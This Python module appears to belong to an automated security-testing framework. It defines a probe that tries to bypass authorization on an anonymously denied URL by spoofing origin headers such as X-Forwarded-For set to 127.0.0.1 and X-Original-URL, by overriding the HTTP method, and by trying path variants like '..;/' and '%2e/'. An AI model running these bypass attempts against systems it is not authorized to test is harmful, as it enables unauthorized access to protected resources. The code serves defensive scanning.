"""Authentication / authorization bypass probing.

The `authenticate` and `escalate` edge types existed with no action able to
prove either from a URL alone, so the two transitions that matter most for an
ATO chain — reach a protected resource anonymously, then reach one you should
not — were unarmable. `auth.jwt.*` covers token forgery; this covers the other
half: an endpoint that denies anonymous access but accepts a spoofed origin
header or a path that its access-control rule does not normalize.

The probe is anonymous by construction (`no_session`). Sending the target's
own global credential and then calling the result "public" was the exact false
positive this check must not produce.
"""

import re
from urllib.parse import urlparse, urlunparse

from actions.registry import action, ActionContext, ActionResult
from tools.wrappers import curl

_DENY_STATUS = (401, 403)

# Response bodies that mean "still denied" even with a 200 or 3xx status.
_DENY_MARKERS = re.compile(
    r"sign\s*in|log\s*in|login|authenticate|unauthorized|forbidden|"
    r"access\s+denied|not\s+authori[sz]ed|permission\s+denied|"
    r"session\s+expired|please\s+log",
    re.IGNORECASE,
)

# (header, value). An empty value means "the path being requested", which is
# how the X-Original-URL / X-Rewrite-URL rewrite tricks are expected to be
# pointed at the protected resource.
_HEADER_VARIANTS = (
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Original-URL", ""),
    ("X-Rewrite-URL", ""),
)

# Path suffixes that some front-end access-control rules fail to normalize
# while the application behind them does. Each is applied to the same URL.
_PATH_VARIANTS = ("/", "/.", "..;/", "//", "%2e/", "/%2e")


def _status(raw: dict) -> int:
    return int(raw.get("status") or 0)


def _body(raw: dict) -> str:
    return str(raw.get("body") or "")


def _denied(raw: dict) -> bool:
    status = _status(raw)
    if status in _DENY_STATUS:
        return True
    text = _body(raw) + " " + str(raw.get("headers") or "")
    return 300 <= status < 400 and bool(_DENY_MARKERS.search(text))


def _path_variant(url: str, suffix: str) -> str:
    parsed = urlparse(url)
    path = parsed.path or "/"
    return urlunparse(parsed._replace(path=path.rstrip("/") + suffix))


def _looks_like_content(raw: dict) -> bool:
    if not (200 <= _status(raw) < 300):
        return False
    body = _body(raw)
    # A one-line "ok" or an empty 200 is an accepted request, not necessarily
    # the protected content. Require something with substance and no denial
    # wording.
    return len(body.strip()) >= 200 and not _DENY_MARKERS.search(body)


@action(
    id="auth.bypass.probe",
    risk="MEDIUM",
    detectability="medium",
    requires=["url"],
    produces="VulnCandidate",
    idempotent=True,
    description=(
        "Probe an anonymously denied endpoint for authorization bypass: "
        "spoofed origin headers and unnormalized path variants. Anonymous "
        "baseline, denial required, content required twice."
    ),
    category="auth",
)
async def bypass_probe(ctx: ActionContext) -> ActionResult:
    url = str(ctx.params.get("url") or ctx.target or "").strip()
    if not url:
        return ActionResult(False, error="url is required")
    method = str(ctx.params.get("method") or "GET").upper()
    headers = {"User-Agent": "Mozilla/5.0 (compatible; bhs-probe)"}
    if isinstance(ctx.params.get("headers"), dict):
        headers.update(ctx.params["headers"])

    baseline = await curl(url, method=method, headers=headers,
                          output="full", no_session=True,
                          follow_redirects=False)
    if not _denied(baseline):
        return ActionResult(
            False, confidence="TENTATIVE",
            error=(f"endpoint does not deny anonymous access "
                   f"(HTTP {_status(baseline)}); nothing to bypass"))
    denial_text = _body(baseline)

    findings = []
    attempts = [(name, value, url, method) for name, value in _HEADER_VARIANTS]
    attempts.append(("X-HTTP-Method-Override", "GET", url, "POST"))
    for suffix in _PATH_VARIANTS:
        variant_url = _path_variant(url, suffix)
        if variant_url != url:
            attempts.append((f"path:{suffix}", "", variant_url, method))

    seen: set[tuple[str, str, str]] = set()
    for name, value, probe_url, probe_method in attempts:
        probe_headers = dict(headers)
        if name.startswith("path:"):
            pass
        else:
            probe_headers[name] = value or (urlparse(probe_url).path or "/")
        key = (name, probe_url, probe_method)
        if key in seen:
            continue
        seen.add(key)

        raw = await curl(probe_url, method=probe_method,
                         headers=probe_headers, output="full",
                         no_session=True, follow_redirects=False)
        if not _looks_like_content(raw):
            continue
        body = _body(raw)
        if body.strip() == denial_text.strip():
            continue
        again = await curl(probe_url, method=probe_method,
                           headers=probe_headers, output="full",
                           no_session=True, follow_redirects=False)
        if not _looks_like_content(again):
            continue
        findings.append({
            "url": probe_url,
            "vector": name,
            "header": ({} if name.startswith("path:")
                       else {name: probe_headers[name]}),
            "method": probe_method,
            "baseline_status": _status(baseline),
            "status": _status(raw),
            "body_preview": body[:400],
        })
        break

    if not findings:
        return ActionResult(
            False, confidence="TENTATIVE",
            error="no authorization bypass reproduced")
    return ActionResult(
        True, confidence="CONFIRMED",
        data={"findings": findings, "count": len(findings),
              "baseline_status": _status(baseline)},
        evidence={"action": "auth.bypass.probe",
                  "vector": findings[0]["vector"],
                  "baseline_status": _status(baseline),
                  "status": findings[0]["status"]},
    )
